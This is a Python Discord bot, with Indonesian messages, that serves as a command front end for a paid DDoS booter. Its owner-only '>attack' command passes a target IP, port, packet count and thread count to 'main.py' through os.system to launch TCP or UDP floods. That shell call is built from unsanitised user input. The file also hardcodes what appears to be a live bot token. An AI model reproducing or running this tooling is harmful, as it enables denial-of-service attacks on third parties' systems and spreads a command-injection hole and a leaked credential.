import discord
import os
import time
from discord.ext import commands

owners  = [869611005464944651]

client = commands.Bot(command_prefix=">", help_command=None)

@client.event
async def on_ready():
    print("Bot Sudah Aktif !!  Subscribe Channel Irgy Notwrong")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"MENU KETIK >help"))

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print("Command Tidak Dapat Di Temukan")
    if isinstance(error, commands.MissingRequiredArgument):
        if ctx.command.qualified_name == 'TCP':
            await ctx.send("**>attack TCP IP PORT PACKET THREADS**")
        if ctx.command.qualified_name == 'UDP':
            await ctx.send("**>attack UDP IP PORT PACKET THREADS**")

@client.command()
async def ping(ctx):
    embed=discord.Embed(
        title=f":hourglass: Bot HTTP Ping is {round(client.latency * 1000)}ms",
        color=discord.Colour.red()
    )
    await ctx.reply(embed=embed)

@client.command()
async def attack(ctx, method, ip, port, times, threads):
    if ctx.author.id not in owners:
        await ctx.send(":clown: Kamu Tidak Ada Izin Untuk Memakai DDOS idiot | go beli akses di irgy :clown:")
    else:
        await ctx.send(f":smiling_imp: Sent Attack to {ip}:{port} :smiling_imp:")
        os.system(f"py main.py {method} {ip} {port} {times} {threads}")

@client.command()
async def help(ctx):
    await ctx.send("```\n>ping (show bot ping)\n>methods (show methods)\n>usage (show tutorial)```")

@client.command()
async def usage(ctx):
    await ctx.reply(">attack METHOD IP PORT PACKET THREADS")

@client.command()
async def methods(ctx):
    embed=discord.Embed(
        title="- TCP\n- UDP",
        color=discord.Colour.red()
    )
    await ctx.reply(embed=embed)

client.run("ODk4ODE4MzQ5MzUyNDk3MTcy.YWpv0Q.plKoeV7b0K4cJ58DjR5jp8RrwX8", bot=True)